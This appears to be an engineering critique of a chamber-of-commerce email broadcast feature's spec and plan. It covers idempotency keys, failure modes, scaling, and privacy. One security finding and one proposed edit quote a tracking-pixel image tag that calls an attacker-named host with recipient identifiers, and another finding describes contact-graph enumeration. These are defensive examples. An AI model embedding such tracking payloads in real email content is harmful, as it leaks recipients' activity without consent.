# Critique Report: F7 — Email Broadcast (E-Blast)

**Date**: 2026-04-29
**Feature**: [spec.md](../spec.md)
**Plan**: [plan.md](../plan.md)
**Verdict**: ⚠️ **PROCEED WITH UPDATES** (1 🎯 Must-Address + 14 💡 Recommendations + 5 🤔 Questions)

---

## Executive Summary

F7's spec + plan are **structurally sound and tasks-ready** — 12 clarifications closed across 4 sessions, Constitution Check GREEN, audit-event catalogue reconciled to 32 entries, 6 SLOs with concrete budgets, and a clean Clean Architecture mapping.

However, two serious concerns surface under stress:

1. **Engineering 🎯 Must-Address (E2)**: FR-020's idempotency-key format `broadcast-{tenantId}-{broadcastId}-attempt-{n}` is mathematically *unable* to prevent duplicate Resend broadcasts in the cross-cron-retry scenario it claims to guard against. Each retry varies `n`, so Resend treats each call as a new request. The fix is small (drop `-attempt-{n}`) but the bug, if shipped, would let a transient DB failure produce 2× recipient deliveries — an irreversible reputational harm.

2. **Product 💡 Strategic gap**: F7 commits 18-22 days of build effort and 4 new dependencies to deliver a benefit whose **historical actual utilization is unknown**. The PDF-derived quota baseline (415 broadcasts/year possible) likely overstates demand by 5-10× based on industry benchmarks. SC-001's "80% of paid quota delivered" target is at risk of being unachievable not because F7 fails technically, but because members never submit. Recommend: pull the 2024-2025 manual e-blast count from chamber records before /speckit.implement and right-size adoption expectations.

Lesser concerns include a tracking-pixel bypass (`<img src>` allowlisted without source restriction), a minor information-disclosure leak in custom-list validation error responses, missing recipient-list-stress-test for the SC-010 submit-endpoint budget, and a few traceability polish items inherited from the audit pass.

The plan addresses Constitution Principles I, II, III, V–X with rigour. Principle IV (PCI DSS) is N/A — F7 has zero payment surface. The 12 deviations in plan.md § Complexity Tracking are well-justified.

## Engineering Lens Findings 🔬

### 4a. Architecture Soundness

| ID | Severity | Finding | Suggestion |
|----|----------|---------|------------|
| E1 | 💡 | **F3 barrel growing F7-flavored.** F7 adds 4 new exports to F3's public barrel (`getMembersBySegment`, `getMemberPrimaryContact`, `lookupContactEmailInTenant`, `lookupMemberPrimaryContactEmailInTenant`). F4 added 2; F5 added 3. F8/F9 will add more. F3's barrel is becoming a junk drawer of cross-module read APIs. | Consider: when F8 lands, factor a dedicated `members-readonly-api` module (or `chamber-graph` module) that exposes ALL cross-cutting member lookups. F4 / F5 / F7 / F8 all depend on it instead of growing F3's barrel. Defer to F8 plan unless F7 patterns warrant pre-emptive split now. |
| E2 | 🎯 | **FR-020 idempotency-key format is broken.** `broadcast-{tenantId}-{broadcastId}-attempt-{n}` varies `n` per retry. Cross-cron-retry scenario (Resend dispatch succeeds, DB UPDATE fails, tx aborts, cron tick 2 picks up the still-`approved` row): cron tick 2 increments `n` and calls Resend with a DIFFERENT idempotency key → Resend treats it as a NEW request → **TWO Resend broadcasts created**. The 5,000-recipient cap means up to 10,000 emails sent on what should have been one broadcast. Reputational harm + GDPR Art. 13 (info to data subjects) + complaint-rate spike. | Drop `-attempt-{n}` from the key. Use stable `broadcast-{tenantId}-{broadcastId}`. Cross-cron retries with the same key return the SAME existing Resend broadcast (Resend's idempotency primitive). SDK auto-retries within a single tick still use the same key (Resend SDK convention). Update FR-020 + plan.md § Reliability + research.md. |
| E3 | 💡 | **F6 stub-port is a hidden coupling time-bomb.** F7's `EventAttendeesRepository.findRecentAttendeeEmails` returns `[]`; F6's /speckit.implement swaps in the real impl. If F6 changes its schema (e.g., stores attendees keyed by `tenant_id + event_id + email` or `attendee_id` not `email_lower`), F7's contract assumption breaks silently. | F7 ships a contract test that F6's implementation MUST pass before F6 can ship: assert `findRecentAttendeeEmails(ctx, days=90)` returns `string[]` of lowercase emails for attendees in the past 90 days. Add to F6's tasks.md as a hard precondition. |

### 4b. Failure Mode Analysis

| ID | Severity | Finding | Suggestion |
|----|----------|---------|------------|
| E4 | 💡 | **Resend Broadcasts API rate limits not documented.** research.md § 1 mentions audience-add throttle (100ms) but Resend's docs don't publish a public Broadcasts rate limit. At 5,000 recipients × 100ms = 500s = 8.3min — well within the approve-and-send budget BUT only if Resend doesn't return 429 mid-stream. | Add a load-test integration test that simulates Resend returning 429 every Nth call and verifies our retry-with-backoff handles partial-audience-fill correctly. (Worst case: 4,999 contacts added, 1 failed → broadcast dispatches to 4,999 not 5,000 — is that acceptable? Spec FR-016 says "dispatch-time list is source of truth" so yes, but logging + audit must capture the discrepancy.) |
| E5 | 💡 | **Cron-job.org is a single point of failure.** F7 depends on cron-job.org for scheduled-send dispatch (US6). If cron-job.org is down for 24h, all `approved` broadcasts past their `scheduled_for` accumulate. When cron resumes, all 100+ rows fire in a rush — thundering herd on Resend + on the DB. | Add a "Manual trigger" button on admin queue for any `approved` broadcast: bypasses cron and runs the dispatch use-case inline. | E6 | 💡 | **Resend account-level outage blast radius.** If Resend has a regional outage, F7 broadcasts fail (correctly handled by FR-021/022) BUT F1 transactional notifications also fail (admin "you have a pending review" + member "your submission was approved" emails). ### 4c. Security & Privacy

| ID | Severity | Finding | Suggestion |
|----|----------|---------|------------|
| E7 | 💡 | **Unsubscribe token email-hash is unsalted.** Token payload `eml: sha256(emailLower)` is the same hash for the same email across all tenants. While the token itself is HMAC-signed (per-token signature unique), the email-hash is not. An attacker with two tenants' tokens for the same recipient can verify identity. | Pepper the email hash with `tenant_id`: `eml: sha256(tenant_id + ':' + email_lower)`. Defeats cross-tenant rainbow-table attacks at zero cost. Update research.md § 4 + contracts/unsubscribe-public.md token format. |
| E8 | 💡 | **Custom-list validation reveals tenant graph membership.** FR-015d: rejection response lists each unresolved address verbatim. Member submits `competitor1@example.com, mole@chamber.com`; response confirms `competitor1@` is unresolved (not in graph) and `mole@` resolved (in graph). Compromised member account → enumerator of the chamber's contact graph. | API response: only return COUNT of unresolved (e.g., `unresolvedCount: 2`); no addresses. Client-side validates each entry against the same graph (member already has access to their own tenant's data) and shows the addresses to the submitter only. Server response stays opaque. |
| E9 | 💡 | **`<img src>` allowlisted without source restriction.** FR-002a allows `img[src]` in member-authored HTML. A malicious or compromised member account can embed `<img src="https://attacker.com/track.gif?recipient=X">` to track recipient opens — bypasses our SC-005 privacy-OFF default by piggybacking on the member's content. | Either: (a) move source allowlisting from F7.1 to MVP — restrict `img[src]` to `https://*.resend.com/*`, the tenant's verified domain, and a small chamber-managed CDN allowlist; OR (b) drop `img` from FR-002a allowlist entirely (members link to images instead). Admin review is the human gate but human gates are bypass-prone. (a) is the cheaper fix. |
| E10 | 💡 | **CSRF / Origin allow-list not enumerated in contracts.** F1 ships HSTS + Origin allow-list as the CSRF mitigation in middleware. F7's POST routes inherit this but contracts/broadcasts-api.md doesn't say so. Future maintainer might add a custom Origin handler that breaks the inheritance. | Add a § "CSRF / Origin" cross-reference in contracts/broadcasts-api.md pointing to F1 middleware. Same in contracts/resend-webhook.md (which is exempt from CSRF because authz is signature-only). |
| E11 | 🤔 | **Token URL leaks via mail-server logs / proxies.** The unsubscribe token URL appears in recipient's mail headers, ISP caches, and corporate mail-scan services. While the token is HMAC-signed, the URL is observable. Pre-fetch protection (idempotent upsert) handles malware-scanner-prefetch but doesn't address log retention. | Acknowledged trade-off (research.md § 4 + contracts/unsubscribe-public.md § 9). Add to security checklist: "Verify pino redact config covers the FULL `/unsubscribe/[token]` URL (token + query) on all log levels — especially access logs at the Vercel platform layer." |

### 4d. Performance & Scalability

| ID | Severity | Finding | Suggestion |
|----|----------|---------|------------|
| E12 | 💡 | **Submit endpoint p95 < 1.2s budget at the 5k recipient cap is unverified.** Sanitiser ~50-200ms + segment resolution (5k member rows × hash join × suppression anti-join) ~500ms+ + audit emit ~50ms + insert ~100ms = potentially 700-1100ms before headroom. At p95, a heavier-than-typical body or larger-than-typical suppression list could push past 1.2s. | Pre-stress-test the segment resolver at the 5k recipient cap **before locking SC-010**. If realistic p95 is >1.2s, either widen the budget OR shift the segment resolution to a background job (return 202 with a job id; client polls). |
| E13 | 💡 | **Webhook write-amplification at SaaS scale.** 5k recipients × 4 events = 20k row inserts in `broadcast_deliveries` per broadcast. 8 broadcasts/week peak = 160k events/week = ~600k function invocations/month at SweCham-only scale. Vercel Hobby plan limit: 100k function invocations/month. **F7 alone could exceed Hobby plan limits.** | Verify Vercel plan accommodates the volume. If staying on Hobby: batch webhook events at Resend (Resend supports per-batch event delivery) so 1 webhook call covers N events. If moving to Pro: document the cost in F11 SaaS-billing pricing. |
| E14 | 💡 | **Composite index column order may be wrong.** Plan specifies `broadcasts(tenant_id, status, requested_by_member_id)` for member-portal "my broadcasts" query. But that query filters by `requested_by_member_id = self.id` first (single member). Index selectivity is best when the highest-selectivity column comes first AFTER tenant_id. | Reorder to `broadcasts(tenant_id, requested_by_member_id, status)` for the member-portal index; keep the `tenant_id, status, ...` index for the admin-queue. Verify with `EXPLAIN` against a seeded benchmark. |
| E15 | 🤔 | **`marketing_unsubscribes` unbounded growth.** SweCham scale: hundreds. SaaS scale: 100k+ rows per tenant after a few years. Suppression filter at dispatch joins recipient list against suppression list. PK `(tenant_id, email_lower)` covers the join. But verify the actual SQL used — `WHERE email_lower IN (5000-element-array)` could be slow even with index. | Use the recipient list as the small side of a hash join: `SELECT email_lower FROM jsonb_array_elements_text(:emails::jsonb) AS t(email_lower) EXCEPT SELECT email_lower FROM marketing_unsubscribes WHERE tenant_id = :tid` — Postgres optimizer handles this well. Verify with EXPLAIN at the recipient-cap (5,000 elements) + 100k suppression rows. |

## Recommended remediation

I propose **two surgical edits** to spec.md and one to plan.md, all small + reversible:

### Edit 1: Spec FR-020 (must-address)

**Current** (spec.md FR-020):
> Each Resend dispatch MUST attach a `Idempotency-Key` of the form `broadcast-{tenantId}-{broadcastId}-attempt-{n}` so a retried dispatch never produces duplicate Resend broadcasts in the Resend account.

**Proposed**:
> Each Resend dispatch MUST attach a stable `Idempotency-Key` of the form `broadcast-{tenantId}-{broadcastId}` (no attempt counter). Cross-attempt retries (whether from SDK auto-retry within a single tick or from cron-tick re-dispatch after a failed transaction) reuse the same key, so Resend's idempotency primitive returns the SAME existing broadcast resource — no duplicate Resend broadcasts in the account, no duplicate recipient deliveries.

### Edit 2: Spec FR-002a (privacy/branding — img-src)

**Current** (spec.md FR-002a allowlist):
> Allowed tags: `p`, `br`, `strong`, `em`, `u`, `a[href]`, `ul`, `ol`, `li`, `h1`–`h4`, `blockquote`, `img[src]`, `hr`.

**Proposed (Option A — remove img from MVP)**:
> Allowed tags: `p`, `br`, `strong`, `em`, `u`, `a[href]`, `ul`, `ol`, `li`, `h1`–`h4`, `blockquote`, `hr`. **Image embedding is OUT-OF-SCOPE for MVP** — members link to externally hosted images (e.g., "View product image: https://fogmaker.com/product.png") instead of embedding them. Image embedding (with mandatory same-origin / Resend-CDN source allowlist) is F7.1 scope.

**OR (Option B — keep img with allowlist)**:
> Allowed tags: ... `img[src]` ... — `img[src]` URLs MUST resolve to a host on a tenant-admin-configured allowlist (default: `https://*.resend.com/*` + the tenant's verified `broadcasts_sender_domain`). Cross-origin image sources (including `https://attacker.com/track.gif`) are stripped silently with a warning logged for admin review.

I recommend **Option A** — it's the simplest fix and aligns better with the privacy-OFF branding promise (SC-005). Members linking to images works fine in 2026 email clients (most show a "View images" prompt anyway).
